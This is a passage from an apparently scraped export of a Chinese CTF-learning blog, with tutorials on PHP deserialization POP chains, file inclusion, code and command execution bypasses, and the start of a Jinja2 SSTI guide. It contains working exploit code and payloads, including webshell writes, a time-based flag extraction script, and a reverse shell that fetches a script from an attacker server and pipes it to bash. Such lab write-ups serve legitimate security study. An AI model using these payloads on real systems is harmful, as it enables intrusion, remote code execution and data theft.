$this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } public function __toString() //把类当作字符串使用时触发 { $content = $this-&gt;str['str']-&gt;source; return $content; } 查看一下怎么能够触发__toString()方法 public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } 知要echo test即可 整条链子为 C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get() exp如下 &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $a= new C1e4r(); $b= new Show(); $c= new Test(); $c-&gt;params['source'] = \"/var/www/html/f1ag.php\"; $a-&gt;str = $b; $b-&gt;str['str'] = $c; $phar = new Phar(\"exp.phar\"); //生成phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); $phar-&gt;setMetadata($a); //触发头是C1e4r类 $phar-&gt;addFromString(\"exp.txt\", \"test\"); //生成签名 $phar-&gt;stopBuffering(); ?&gt; 修改生成得phar文件后缀 上传成功后回到文件读取点来读phar文件 拿到base64加密得flag 反序列化字符逃逸一、概念在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。 二、字符变多例子： 该题源码如下 &lt;?php include 'flag.php'; function filter($string){ return str_replace('x','yy',$string); } $username=$_GET['u']; $password=\"aaa\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); echo $r; $a= unserialize($r); if ($a[1]==='admin'){ echo $flag; } highlight_file(__FILE__); ?&gt; 文件包含了flag 然后filter()方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度 我们试着传入u=admin 序列化为： a:2:{i:0;s:5:\\\"admin\\\";i:1;s:3:\\\"aaa\\\";} 反序列化后 a[1]不等于”admin” 没有满足条件 我们构造一下数组 &lt;?php $a= array('a',\"admin\"); echo serialize($a); a:2:{i:0;s:1:\"a\";i:1;s:5:\"admin\";} 但是我们只有一个参数username可控 可以利用字符串逃逸 复制自己想要构造的字符串 \";i:1;s:5:\"admin\";} 按照长度添加字符串，已知长度为19 则在前方填充19个x 'xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";} 测试一下 &lt;?php $a= array('xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";}',\"a\"); $s= serialize($a); $v = str_replace('x','yy',$s); echo $v; 运行结果 a:2:{i:0;s:38:\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\";i:1;s:5:\"admin\";}\";i:1;s:1:\"a\";} 可以看到已经逃逸出来了 这里利用了序列化的特性 反序列化看一下 array(2) { [0] =&gt; string(38) \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" [1] =&gt; string(5) \"admin\" } 可以观察整个数据的变化 成功逃逸。获得flag 三、字符变少也是拿一道题做例子 &lt;?php error_reporting(0); include 'flag.php'; function filter($string){ return str_replace('sec','',$string); } $username=$_GET['u']; $password=$_GET['p']; $auth=\"guest\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); $a=unserialize($r); if($a[2]==='admin'){ echo flag; } highlight_file(__FILE__); ?&gt; 跟上一道题差不多 先随意构造一下争取的payload： &lt;?php $a= array(\"u\",\"p\",\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 运行后拿到所需部分 \";i:2;s:5:\"admin\";} 需要我们传入的payload u=xxx&amp;p=xxxx 已知两个可控值中间的部分不变（可能会多一位） \";i:1;s:1:\" 这里可以利用替换方法换成空值从而完成逃逸 &lt;?php $a= array(\"secsecsecsec\",'\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}',\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 执行结果 a:3:{i:0;s:12:\"secsecsecsec\";i:1;s:31:\"\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}\";i:2;s:5:\"admin\";} 可以看到已经完成了逃逸 反序列化一下看看 array(3) { [0] =&gt; string(12) \"\";i:1;s:31:\"\" [1] =&gt; string(1) \"p\" [2] =&gt; string(5) \"admin\" } a[2]=admin 拿到flag","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"PHP文件包含漏洞基础","slug":"PHP文件包含漏洞基础","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T03:48:24.163Z","comments":true,"path":"posts/f4224d8e.html","link":"","permalink":"http://h3geeker.top/posts/f4224d8e.html","excerpt":"","text":"一、文件包含漏洞文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。 二、漏洞产生原因服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害 举一个简单的例子 &lt;?php $filename = $_GET['page']; include($filename); ?&gt; 这里的filename参数没有经过过滤，直接赋值给include()函数，我们就可以修改filenname的值，执行其他操作 我们在同目录下创建一个info.txt 内容如下 这样我们只需要把info.txt包含进去即可解析 三、PHP常用的包含函数在php中，常用的为以下4个函数 include() include_once() require() require_once() 其中include和require的区别主要是include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 include_once，require_once这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 四、漏洞利用文件包含利用有两种 1.包含本地服务器的文件 2.包含其他服务器的文件 而且，包含的时候，不一定要包含php文件 只要文件中有一块完整的php代码即可 例如a.txt 内容为 &lt;?php phpinfo(); ?&gt; 也是可以的 1.包含本地服务器的文件举一个例子，利用CTFSHOW的靶机 &lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集） /etc/apache2/* #Apache配置文件，可以获知Web目录、服务端口等信息 /etc/nginx/* #Nginx配置文件，可以获知Web目录、服务端口等信息 /etc/crontab #定时任务文件 /etc/environment #环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况 /etc/hostname #主机名 /etc/hosts #主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名 /etc/issue #系统版本信息 /etc/mysql/* #MYSQL配置文件 /etc/php/* #PHP配置文件 /proc 目录 #/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可 /proc/[pid]/cmdline #cmdline可读出比较敏感的信息 # ssh日志，攻击方法： ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1 /var/log/auth.log # apache日志 /var/log/apache2/[access.log|error.log] https://www.anquanke.com/post/id/231407 这里可以读取任意文件，我们可以试着读/etc/passwd 2.包含远程服务器的文件这里需要前提 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 这里可以本地测试一下，利用虚拟机做远程服务器 &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; Include($filename); ?&gt; 这里存在文件包含漏洞 “服务器”上存在webshell 传参： http://localhost/include.php?page=http://192.168.179.129/1.php 可以看到成功包含到了webshell 3.限制后缀名例子 &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; include($filename. \".H3h3QAQ\"); ?&gt; 可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为H3h3QAQ 所以我们需要Bypass (1).%00截断需要PHP&lt;5.3.4并且magic_quotes_gpc = Off /include.php?page=info.txt%00 (2).长度截断PHP版本&lt;=5.2.? Windows下目录最大长度为256字节，超出的部分会被丢弃掉Linux下目录最大长度为4096字节，超出的部分会被丢弃掉 构造payload的时候超出限制即可 类似于 /include.php?page=info.txt....................*n (3).伪协议zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码） phar://文件路径/phar文件名称/phar内的文件名称 phar://协议与zip://类似，同样可以访问zip格式压缩包内容 多配合在上传题使用 若发现只有jpg、png才可以上传文件 则可以利用phar伪协议 写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可 ?file=zip://D:\\zip.jpg%23phpinfo ?file=phar://zip.zip/phpinfo 4.限制前缀例如../被过滤 可以利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ 或者二次编码 ../ %252e%252e%252f 5.PHP伪协议(1).file:// 协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 POC /include.php?file=file://phpinfo.txt /include.php?file=http://127.0.0.1/phpinfo.txt (2).php://协议allow_url_include :仅php://input php://stdin php://memory php://temp 需要on php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=\"multipart/form-data\" 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 1.php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 对于php://来说，是支持多种过滤器嵌套的 php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名） #如果|被过滤掉了，可以使用多过滤器: php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称（包含后缀名） 嵌套过程的执行流程为从左到右 其实是可以简写成这样的php://filter/[过滤器] ，php会自己进行识别。 过滤器列表: 过滤器名称 说明 类别 版本 string.rot13 rot13转换 字符串过滤器 PHP&gt;4.3.0 string.toupper、string.tolower 大小写互转 字符串过滤器 PHP&gt;5.0.0 convert.base64-encode、convert.base64-decode base64编码转换 转换过滤器 PHP&gt;5.0.0 convert.quoted-printable-encode、convert.quoted-printable-decode URL编码转换 转换过滤器 PHP&gt;5.0.0 convert.iconv.编码1.编码2 任意编码转换 转换过滤器 PHP&gt;5.0.0 zlib.deflate、zlib.inflate zlib压缩 压缩过滤器 PHP&gt;5.1.0 bzip2.compress、bzip2.decompress zlib压缩 压缩过滤器 PHP&gt;5.1.0 6.PHP伪协议常用函数file_get_contents() file_put_contents() readfile() fopen() file() show_source() highlight_file() 五、参考链接 https://blog.csdn.net/qq_42181428/article/details/87090539 https://blog.csdn.net/bmth666/article/details/104616201 https://www.anquanke.com/post/id/231407#h3-6 https://www.cnblogs.com/jzking121/p/15144416.html https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430 https://segmentfault.com/a/1190000018991087","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"PHP代码执行漏洞","slug":"PHP代码执行漏洞","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T03:48:16.317Z","comments":true,"path":"posts/12a5c357.html","link":"","permalink":"http://h3geeker.top/posts/12a5c357.html","excerpt":"","text":"代码命令执行函数代码执行 函数 说明 例子 ${php代码} ${phpinfo}; mixed eval(string $code) 把字符串code作为php代码执行 eval(‘phpinfo();’); bool assert(mixed $assertion [, string $description]) assert()会检查指定的assertion并在结果为FALSE时采取适当的相应。如果assertion是字符串，它将会被assert()当作PHP代码来执行 assert(‘system(“whoami”)’); mixed preg_replace(mixde $patterm,mixed $replacement,mixed $subject [, int $limit =-1 [, int&amp;$count]]) 搜索subject中匹配pattern的部分，以replacement进行替换。当$pattern处存在e修饰符是(5.5.0版本/e修饰符已经被弃用了)，$replacement会被当做php代码执行 preg_replace(“/test/e”,”system(‘whoami’)”,’test’); mixed call_user_func(callable $callback [, mixed $paramenter [, mixed $..]]) 第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递 call_user_func(‘system’,’whoami’); mixed call_user_func_array(callable $callback,arry $param_arr) 把第一个参数作为回调函数（callback）调用，把参数数组(param_arr)作为回调函数的参数传入 call_user_func_array(‘system’,array(‘whoami’)); string creat)function( string $args,string $code) 在php中使用creat_function()创建一个匿名函数(lambda-style)，如果对参数为进行严格的过滤审查，攻击者可以通过提交特殊字符串给creat_function()从而导致任意代码执行 creat_function(‘$test’,’};phpinfo();/*’); array array_map(callable $callback ,array $array1 [, array $…]) 为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。 array_map(‘system’,array(‘whoami’)); array array_filter (array $array [, callable $callback [, int $flag=0]]) 依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保持不变 array_filter(array(‘whoami’),’system’); bool usort( array &amp;$array,callabe $value_compare_func) 通过用户自定义的比较函数对数组进行排序 $a=array(‘whoami’,’t’);usort($a,”system”); bool uasort(array &amp;$array, callable $value_compare_func) 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 $a=array(‘whoami’,’t’);uasort($a,”system”); 命令执行 函数 说明 例子 string system( string $command [, int &amp;$return_var] ) command是要执行的命令。如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出 system(‘whoami’); void passthru ( string $command [, int &amp;$return_var]) 执行外部程序并且显示原始输出 passthru(‘whoami’); void pcntl_exec(string $path [, arry $args [, array $envs]] ) path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本args是一个要传递给程序的参数的字符串数组。该模块不能在非Unix平台（Windows）上运行 pcntl_exec(“/bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle); string exec (string $command [, array &amp;$output [, int &amp;$return_bar]]) 执行所指定的命令，并返回结果的最后一行内容，不显示输出 echo exec(‘whoami’); string shell_exec(string $cmd) 通过shell环境执行命令，并且将完整的输出以字符串的方式返回 echo shell_exec(‘whoami’); resource popen(string $command,string $mode) 打开一个指向进程的管道，该进程该进程由派生给定的command命令执行而产生。后面的mode，当为’r’，返回的文件指针等于命令的STDOUT，当为’w’，返回的文件指针等于命令的STDIN $handle = popen(“bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle); 反引号 echo whoami;(md语法问题) 无回显命令执行&lt;?php highlight_file(__FILE__); if (isset($_GET['cmd'])){ shell_exec($_GET['cmd']); } 该环境为一个无回显的命令执行 所以我们需要判断命令是否执行成功 以下方式可以判断是否成功RCE 判断1. 延迟 ?cmd=sleep 3 通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行 2.HTTP请求 (1).在公网服务器监听端口 nc -lvp port (2).向目标服务器发起http请求，执行curl命令 ?cmd=curl ip:port 如果向目标服务器发起htpp请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞 3.DNS请求 dnslog ?cmd=ping 9y8y3k.dnslog.cn 利用1.使用 &gt;或&gt;&gt; ?cmd=cat flag.php &gt; flag.txt 2.mv或cp ?cmd=mc flag.php flag.txt ?cmd=cp flag.php flag.txt 3.打包压缩 (1).tar打包或tar打包并压缩 tar cvf flag.tar flag.php tar zcvf flag.tar.gz flag.php (2).zip压缩 zip flag.zip flat.php 4.cut and sleep sed指定读取文件的第几行 cat flag.php|sed -n '2p' 提取每一行的第三个字节 cut -b 3 flag文件 最后 cat flag.php|sed -n '2p'|cut -b 1 exp import requests import time url =\"\" flag= \"\" for i in range (6,65): for j in range(32,127): data=\"a%3D`cat flag.php|sed -n '2p'|cut -b {}`;[$a %3D \\\"{}\\\"] %26%26 sleep2\".format(i,chr(j)) start_time=time.time() requests.get(url=url+data) spend_time=end_time -start_time if spend_time&gt;=2: flag+=chr(j) print(flag) 写入webshell直接写入?cmd = echo \"&lt;?php @eval(\\$_POST[h3]);?&gt;\"&gt;webshell.php 外部下载wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名 Dnslog1.命令执行时要避免空格，空格会导致空格后面的命令执行不到； 2.将读取的文件命令用反引号``包括起来； 3.拼劲的域名又长度限制 用&lt;替换读取文件中的空格，且对输出结果base64编码 curl `cat&lt;flag.php|base64` 拼接域名（最终构造结果） curl `cat&lt;flag.php|base64`. 反弹shell1.首先在公网服务器用nc指令监听端口 nc -lvp port 2.然后在公网服务器上写一个文件（qwzf文件） bash -i &gt;&amp;/dev/tcp/ip/poat 0&gt;&amp;1 3.在浏览器执行 ?cmd=curl ip:port/qwzf|bush 有限字符的命令执行##14位可控 &lt;?php highlight_file(__FILE__); if (strlen($_GET[1])&lt;15){ echo strlen($_GET[1]); echo shell_exec($_GET[1]); }else{ exit(\"too long~\"); } 虽然只能传入14个字符 但是并没有限制命令执行次数 所以我们可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段webshell到指定文件。 echo \\&lt;?php&gt;1 echo eval\\(&gt;&gt;1 echo \\$_GET&gt;&gt;1 echo \\[1\\]&gt;&gt;1 echo \\)\\;&gt;&gt;1 mv 1 1.php 本地起环境 经测试 这种换号的php文件也可以运行 写入后蚁剑连接靶机 拿到flag 7位可控&lt;?php highlight_file(__FILE__); if (strlen($_GET[1])&lt;=7){ echo strlen($_GET[1]); echo '&lt;hr/&gt;'; echo shell_exec($_GET[1]); }else{ exit(\"too long~\"); } 小知识点 &gt;a #虽然没有输出但是会创建a这个文件 ls -s #ls基于事件排序（从晚到早） sh a #sh会把a里面的每行内容当作命令来执行 使用\\进行命令拼接 #l\\s=ls base64 #使用base64编码避免特殊字符 目标写入一句话木马 &lt;?php eval($_GET[1]); base64编码后 PD9waHAgZXZhbCgkX0dFVFsxXSk7 我们需要执行 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php payload: &gt;hp &gt;1.p\\\\ &gt;d\\&gt;\\\\ &gt;\\ -\\\\ &gt;e64\\\\ &gt;bas\\\\ &gt;7\\|\\\\ &gt;XSk\\\\ &gt;Fsx\\\\ &gt;dFV\\\\ &gt;kX0\\\\ &gt;bCg\\\\ &gt;XZh\\\\ &gt;Agz\\\\ &gt;waH\\\\ &gt;PD9\\\\ &gt;o\\ \\\\ &gt;ech\\\\ ls -t&gt;0 sh 0 5位可控&lt;?php $sandbox='/var/www/html/sandbox'.md5(\"orange\".$_SERVER); $_SERVER($sandbox); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd'])&amp;&amp;strlen($_GET['cmd'])&lt;=5){ @exec($_GET['cmd']); }else if (isset($_GET['reset'])){ @exec('/bin/rm -rf'.$sandbox); } highlight_file(__FILE__); ?&gt; 知识点： 1.输入通配符* ,Linux会把第一个列出的文件名当做命令,剩下的文件名当作参数 2.通过rev来倒置输出内容(rev命令将文件中的每行内容以字符为单位反序输出) 3.用dir来代替ls不换行输出;rev将文件内容反向输出;在用ls是,写到a时每个文件名都是单独一行 &gt;rev echo '1233'&gt;v *v (等同于命令:rev v) 我们需要把 echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 拆分然后执行 payload &gt;dir &gt;f\\&gt; &gt;ht- &gt;sl *&gt;v &gt;rev *v&gt;a &gt;hp &gt;p\\\\ &gt;1.\\\\ &gt;\\&gt;\\\\ &gt;-d\\\\ &gt;\\\\\\ &gt;64\\\\ &gt;se\\\\ &gt;ba\\\\ &gt;\\|\\\\ &gt;7\\\\ &gt;Sk\\\\ &gt;X\\\\ &gt;x\\\\ &gt;Fs\\\\ &gt;FV\\\\ &gt;d\\\\ &gt;X0\\\\ &gt;k\\\\ &gt;g\\\\ &gt;bC\\\\ &gt;h\\\\ &gt;XZ\\\\ &gt;gZ\\\\ &gt;A\\\\ &gt;aH\\\\ &gt;w\\\\ &gt;D9\\\\ &gt;P\\\\ &gt;S}\\\\ &gt;IF\\\\ &gt;{\\\\ &gt;\\$\\\\ &gt;o\\\\ &gt;ch\\\\ &gt;e\\\\ sh a sh f 无字母shell异或有的时候会遇到这样的情况： &lt;?php error_reporting(0); highlight_file(__FILE__); if(!preg_match('/[a-z0-9]',$_GET['h3'])){ eval($_GET[h3]); } 过滤了数字和字母 这里们可以用到异或 &lt;?php echo \".\"^\"~\"; 输出结果为： P PHP中，两个变量进行异或的时候，会先将把字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。 取反1、二进制的最高位是符号位，0表示正数，1表示附属 2、正数的原码，反码，补码都是相同 3、负数的反码=它的原码的符号位不变，其它位取反（0-&gt;1,1-&gt;0） 4、负数的补码=它的反码+1 5、0的反码、补码都是0 6、PHP没有无符号数 7、在计算机运算的时候，都是以补码的方式来运算，那么运算的结果也是某个数的补码 &lt;?php echo urlencode(~\"phpinfo\"); #%8F%97%8F%96%91%99%90 自增##通配符 使用``反引号+”shell”的方式来getshell shell下可以利用.来执行任意脚本 .或者叫period，他的作用和source一样，就是用当前的shell执行一个文件中命令。比如，当前运行的shell是bash，则.file的意思就是用bash执行file文件中的命令 glob通配符 *可以代替0个及以上任意字符 ?可以代表一个任意字符 用[^x]的方法来构造”这个位置不是字符x” [0-9]来表示一个范围 https://man7.org/linux/man-pages/man7/glob.7.html 这里有glob的更多内容 命令执行绕过Linux命令1.查看文件 命令 作用 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的显示文件 less 和more累死，但是可以往前翻页，而且可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 累死于cat -n，显示的时候输出行号 tailf 类似于tail -f od 读取所给予的文件的内容，并将其内容以八进制的字码显示出来 sort 将文件内容排序 rev 将文件中的每行内容以字符为单位反序输出 string 打印文件中可打印的字符 cut -f 1 filename从文件的每一行剪切字节，字符和字段并将这些字节，字符和字段写至标准输出 2.查找文件find . -name \"fla*\" locate fla* locate 命令无需指定路径，直接搜索即可。该命令实在mlocate.db的数据库下搜索，这个数据库位于/var/lib/mlocate/mlocate.db 它包含了系统中所有文件的索引，并且会在每天早上的时候由cron工具自动更新一次，可以sudo updadb更新其数据库 which 命令主要用来查询可执行文件的位置 whereis 命令会在系统默认安装目录（一般是用root权限时默认安装的软件）查找二进制文件、源码、文档中包含给定查询关键词的文件。 3.寻找文件内容grep -ar fla* / -a不忽略二进制文件 4.文件传输curl 利用curl下载文件 #使用内置option: -o #curl -o dodo1.jpg http:www.linux.com/dodo1.JPG #使用内置option: -O #curl -O http://www.linux.com/dodo1.jpg 5.命令分隔符1.%0a ---&gt;换行符 2.%0d ---&gt;回车符 3.;符号 再shell中，担任\"连续指令\"功能的符号就是\"分号\" 4.&amp;符号&amp;放在启动参数后面表示该进程为后台进程，默认情况下，进程是前台进程，这时九八shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望它在后台启动，可以在启动参数的时候加一个'&amp;'实现这个目的，进程切换到后台的时候，我们把它成为job，切换到后台的时候会输出相关job信息 5.|符号，管道符左面命令的输出就作为管道符右面命令的输入，所以左边的输出不显示 6.&amp;&amp;表示前一条命令执行时，才执行后一条命令 7.||表示上一条命令执行失败后，才执行下一条命令 8.命令终止符%00 %20 # 6.列目录ls dir 空格绕过$IFS在Linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当作变量名，所以导致输出不来结果，然后如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用 ${IFS} $IFS$9 &lt; &lt;&gt; {,} 黑名单过滤1.拼接a=c;b=at;c=flag;$a$b $c 2.base64编码`echo \"Y2F0IGZsYWc=\"|base64 -d` echo \"Y2F0IGZsYWc=\"|base64 -d|bash 3.单引号、双引号c\"\"at flag c''at flag ca\"\"t fl''ag ###4.反斜线 \\ c\\at fl\\ag","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"SSti基础学习","slug":"Python模板注入(SSTI)基础","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T03:57:13.470Z","comments":true,"path":"posts/b0c48792.html","link":"","permalink":"http://h3geeker.top/posts/b0c48792.html","excerpt":"","text":"一、SSTi服务器端模板注入的概念SSTI服务器端模板注入(Server-Side Template Injection)，我们常见的注入有我们熟悉的SQL注入，两者的不通之处就是SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity，而两者的相同部分就是先从用户处获得值作为web应用模板内容的一部分，然后进行编译渲染，如果在其中用户插入了恶意内容，就可能导致一系列的不良后果，比如RCE、信息泄露、getshell等等（凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎，本文针对Python做主要学习） 服务端-&gt;模板文件-&gt;模板引擎-&gt;用户端 二、Flask基础因为常用到SSTi的网站都是Python的网站 所以我在这里会记录一下Flask的基础，以便于学习 1、Flask简介 Flask是一个Python上的web应用框架 web应用框架是一个库和模块的集合，使web应用程序开发人员能够编写web应用程序，而不必担心协议，线程管理等低级细节 基于Werkzeug WSGI工具箱和Jinja2 模板引擎 Werkzeug 是一个 Python 的 HTTP 和 WSGI 工具库，可以方便的在 Python 程序中处理 HTTP 协议相关内容。 功能包括： HTTP header 解析和输出 易用的 request 和 response 对象 交互式 JavaScript 的浏览器调试器 100% WSGI 1.0 兼容 支持 Python 2.6, 2.7 和 3.3. 支持 Unicode 支持基本的 session 和签名 cookie 支持 unicode 的 URI 和 IRI 工具 内建用于修复 WSGI 服务器和浏览器 bug 的库 集成 URL 路由 Jinja 是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。 示例代码： from flask import Flask, render_template_string app = Flask(__name__) @app.route(\"/\") def hello(): return render_template_string(\"Hello {{name}}\",name='world'); if __name__ == \"__main__\": app.run() (1).Jinjia模板特点{{...}}:装载一个变量，模板渲染时，会使用传进来的同名参数变量的代表值替换 {%...%}:装载一个控制语句 {#...#}:装载一个注释，模板渲染的时候会忽视这中间的值 (2).Jinja2中for循环的内置常量 常量 说明 loop.index 当前迭代的索引（从0开始） loop.first 是否是第一次迭代，返回true or false loop.last 是否是最后一次迭代，返回true or false loop.length 序列的长度 不可以使用continue和break表达式来控制循环的执行 (3).过滤器过滤器是通过管道符|来使用的，例如{{name|length}}：来返回name的长度 过滤器想当于一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值然后把结果渲染到页面中 #三、SSTi漏洞的产生 ##1、漏洞成因 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性 如果再渲染之前，存在接受用户输入的操作，并且未经任何处理就将其作为 Web 应用模板内容的一部分，就有可能造成SSTi漏洞的产生 举一个例子： from flask import Flask, render_template_string from flask.globals import request from jinja2 import Template app = Flask(__name__) @app.route(\"/\") def hello(): name = request.args.get('name','hack') info = Template(\"Hello \" + name) return info.render() if __name__ == \"__main__\": app.run() 源码中在渲染前就存在着接受用户输入的操作，我们可以验证一下是否可以注入 我们传入测试payload 可以看到测试payload被成功执行 此时我们就证明漏洞存在，也就意味着我们能够在这个注入点执行该模板引擎的控制语句寄命令 Flask SSTi漏洞的基本思路就是利用Python中的各种魔术方法来利用 四、漏洞利用由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等 魔术方法 说明 __dict__ 保存类实例或对象实例的属性变量键值对字典 __class__ 返回调用的参数类型 __mro__ 返回一个包含对象所继承的基类元素，方法在解析时按照元组的顺序解析 __base__ 返回该对象所继承的基类 __subclasses__ 返回object的子类 __init__ 类的初始化方法 __globals__ 函数会以字典类型放回当前位置的全部全局变量与func_globals等价 __bases__ 返回该对象所继承的类型列表 1、基本步骤###1.基础利用 使用魔术方法进行函数解析，获取基本类 ''.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] 